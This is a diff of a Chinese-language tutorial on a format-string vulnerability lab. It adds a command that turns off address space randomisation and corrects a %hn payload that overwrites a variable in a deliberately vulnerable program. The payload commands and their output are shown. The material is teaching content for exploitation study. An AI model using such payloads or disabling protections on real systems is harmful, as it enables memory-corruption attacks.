@@ -37,6 +37,12 @@ d)  最后使用va_end宏结束可变参数的获取。
 
 
 #### 漏洞程序/实验
+
+**为了简化实验。关闭空间地址随机化**
+```
+sudo sysctl -w kernel.randomize_va_space=0
+```
+
 ```
 // vul.c
 #include <stdio.h>
@@ -163,25 +169,26 @@ Data at target address: 0x9896aa
 如果把值改成0x66887799,换成10进制就是17亿多。这个过程估计需要几个小时，有时间的朋友可以尝试以下。
 
 !!! note
-    注意地址\xD4\xF5\xFF\xBF 中的D4 F5 FF BF 需要大写
+    注意地址\xD4\xF5\xFF\xBF 中的英文字符需要大写
 
 
 #### 攻击五：更快的方法
 %n视为4个字节 %hn视为2个字节 %hhn视为1个字节   
 因此可以尝试用%hn把var的值修改为0x66887799  
-现在把地址bffff5d4按两个字节来分就是 0xbffff5d4和0xbffff5d6。需要把0x7799放在地址0xbffff5d4上，0x6688放在地址0xbffff5d6上。
+现在把地址bffff5d4按两个字节来分就是 0xbffff5d4和0xbffff5d6。因为是小端序，需要把0x7799放在地址0xbffff5d4上，0x6688放在地址0xbffff5d6上。
 ```
-ubuntu@VM-0-17-ubuntu:~$ echo $(printf "\xD4\xF5\xFF\xBF@@@@\xD6\xF5\xFF\xBF")%.8x%.8x%.8x%.8x%.26204x%hn%.4369x%hn > input
+ubuntu@VM-0-17-ubuntu:~$ echo $(printf "\xD6\xF5\xFF\xBF@@@@\xD4\xF5\xFF\xBF")%.8x%.8x%.8x%.8x%.26204x%hn%.4369x%hn > input
 ubuntu@VM-0-17-ubuntu:~$ ./vul < input
 ...
-Data at target address: 0x77996688
+Data at target address: 0x66887799
 ```
 `\xD4\xF5\xFF\xBF@@@@\xD6\xF5\xFF\xBF`是12个字符  
 12 + 8*4 + 26204 = 26248  十六进制是 6688  
 26248 + 4369 = 30617  十六进制是 7799  
 在两个地址之间插入四个字节的@@@@是为了在两个%hn之间在插入一个%x，这样第二个%hn的时候才到累加到30617完成目标  
 
-这个过程几乎是一瞬间的事情，可以看到通过字节拆分后赋值效率很高
+这个过程几乎是一瞬间的事情，可以看到通过字节拆分后赋值效率很高  
+
 
 
 
